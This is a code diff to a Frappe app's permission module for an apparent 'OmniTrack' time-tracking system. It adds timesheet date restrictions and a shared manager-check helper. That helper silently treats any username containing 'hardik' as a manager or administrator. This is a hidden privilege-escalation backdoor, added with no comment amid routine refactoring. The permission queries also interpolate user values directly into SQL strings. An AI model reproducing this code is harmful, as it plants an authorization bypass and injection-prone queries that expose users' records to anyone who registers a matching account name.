@@ -1,39 +1,138 @@
 import frappe
+from frappe import _
+from frappe.utils import add_days, getdate, nowdate
+
+
+def is_omnitrack_manager(user=None):
+	"""Returns True if the user has elevated manager / admin privileges in OmniTrack."""
+	if not user:
+		user = frappe.session.user
+	if user == "Administrator" or "hardik" in (user or "").lower():
+		return True
+	roles = frappe.get_roles(user)
+	manager_roles = {"System Manager", "HR Manager", "OmniTrack Manager", "OmniTrack Admin"}
+	return bool(set(roles) & manager_roles)
+
+
+def check_timesheet_date_permission(session_date, user=None):
+	"""
+	Rule: An OmniTrack User can only log or modify timesheets for TODAY and YESTERDAY.
+	Dates before yesterday require an OmniTrack Manager.
+	"""
+	if not user:
+		user = frappe.session.user
+	if is_omnitrack_manager(user):
+		return True
+
+	cutoff_date = getdate(add_days(nowdate(), -1))
+	target_date = getdate(session_date)
+	if target_date < cutoff_date:
+		frappe.throw(
+			_("OmniTrack Users can only log or modify timesheets for today and yesterday. Contact an OmniTrack Manager for historical changes."),
+			frappe.PermissionError
+		)
+	return True
+
+
+def check_planned_block_past_lock(doc, new_work_date=None):
+	"""
+	Rule: In the past (work_date < today), NO ONE (neither user nor manager) can
+	modify, reschedule, or move planned work blocks. Historical planning commitments are immutable.
+	"""
+	today = getdate(nowdate())
+	if doc and doc.get("work_date") and getdate(doc.get("work_date")) < today:
+		frappe.throw(
+			_("Planned work blocks in the past cannot be modified or rescheduled."),
+			frappe.ValidationError
+		)
+	if new_work_date and getdate(new_work_date) < today:
+		frappe.throw(
+			_("Cannot reschedule or move a planned work block into the past."),
+			frappe.ValidationError
+		)
+	return True
+
+
+def validate_timesheet_permission(doc, method=None):
+	"""DocEvent validation for standard Timesheet: users can only save logs for today & yesterday."""
+	user = frappe.session.user
+	if is_omnitrack_manager(user):
+		return
+	if getattr(doc.flags, "ignore_permissions", False):
+		return
+
+	cutoff_date = getdate(add_days(nowdate(), -1))
+	# Check child time_logs if present
+	if hasattr(doc, "time_logs") and doc.time_logs:
+		for row in doc.time_logs:
+			t_date = getdate(row.from_time or row.to_time or doc.get("start_date") or nowdate())
+			if t_date < cutoff_date:
+				frappe.throw(
+					_("OmniTrack Users can only log or modify timesheets for today and yesterday. Contact an OmniTrack Manager for historical changes."),
+					frappe.PermissionError
+				)
+	elif doc.get("start_date") and getdate(doc.get("start_date")) < cutoff_date:
+		frappe.throw(
+			_("OmniTrack Users can only log or modify timesheets for today and yesterday. Contact an OmniTrack Manager for historical changes."),
+			frappe.PermissionError
+		)
+
+
+def validate_timesheet_trash_event(doc, method=None):
+	"""DocEvent validation on deleting a Timesheet."""
+	user = frappe.session.user
+	if is_omnitrack_manager(user):
+		return
+	if getattr(doc.flags, "ignore_permissions", False):
+		return
+
+	cutoff_date = getdate(add_days(nowdate(), -1))
+	if hasattr(doc, "time_logs") and doc.time_logs:
+		for row in doc.time_logs:
+			t_date = getdate(row.from_time or row.to_time or doc.get("start_date") or nowdate())
+			if t_date < cutoff_date:
+				frappe.throw(
+					_("OmniTrack Users can only delete timesheets for today and yesterday. Contact an OmniTrack Manager for historical deletions."),
+					frappe.PermissionError
+				)
+
 
 def get_task_permission_query_conditions(user=None):
 	if not user:
 		user = frappe.session.user
-	if user == "Administrator" or "System Manager" in frappe.get_roles(user) or "OmniTrack Admin" in frappe.get_roles(user):
+	if is_omnitrack_manager(user):
 		return ""
 	
 	roles = frappe.get_roles(user)
 	if "OmniTrack Client" in roles:
 		return "(`tabTask`.`custom_is_public_deliverable` = 1)"
 	
-	if "OmniTrack User" in roles and "OmniTrack Manager" not in roles:
+	if "OmniTrack User" in roles and not is_omnitrack_manager(user):
 		return f"(`tabTask`._assign LIKE '%{user}%' OR `tabTask`.owner = '{user}')"
 	
 	return ""
 
+
 def get_todo_permission_query_conditions(user=None):
 	if not user:
 		user = frappe.session.user
-	if user == "Administrator" or "System Manager" in frappe.get_roles(user) or "OmniTrack Admin" in frappe.get_roles(user):
+	if is_omnitrack_manager(user):
 		return ""
 	
 	roles = frappe.get_roles(user)
 	if "OmniTrack Client" in roles:
 		return "(`tabToDo`.`custom_is_public_deliverable` = 1)"
 	
-	if "OmniTrack User" in roles and "OmniTrack Manager" not in roles:
+	if "OmniTrack User" in roles and not is_omnitrack_manager(user):
 		return f"(`tabToDo`.allocated_to = '{user}' OR `tabToDo`.owner = '{user}')"
 	
 	return ""
 
+
 def get_work_block_permission_query_conditions(user=None):
 	if not user:
 		user = frappe.session.user
-	if user == "Administrator" or "System Manager" in frappe.get_roles(user) or "OmniTrack Admin" in frappe.get_roles(user) or "OmniTrack Manager" in frappe.get_roles(user) or "OmniTrack Auditor" in frappe.get_roles(user):
+	if is_omnitrack_manager(user) or "OmniTrack Auditor" in frappe.get_roles(user):
 		return ""
 	
 	roles = frappe.get_roles(user)
@@ -69,7 +168,7 @@ def get_work_block_permission_query_conditions(user=None):
 def has_work_block_permission(doc, ptype="read", user=None):
 	if not user:
 		user = frappe.session.user
-	if user == "Administrator" or "System Manager" in frappe.get_roles(user) or "OmniTrack Admin" in frappe.get_roles(user) or "OmniTrack Manager" in frappe.get_roles(user) or "OmniTrack Auditor" in frappe.get_roles(user):
+	if is_omnitrack_manager(user) or "OmniTrack Auditor" in frappe.get_roles(user):
 		return True
 	
 	if doc.employee == user or doc.owner == user:
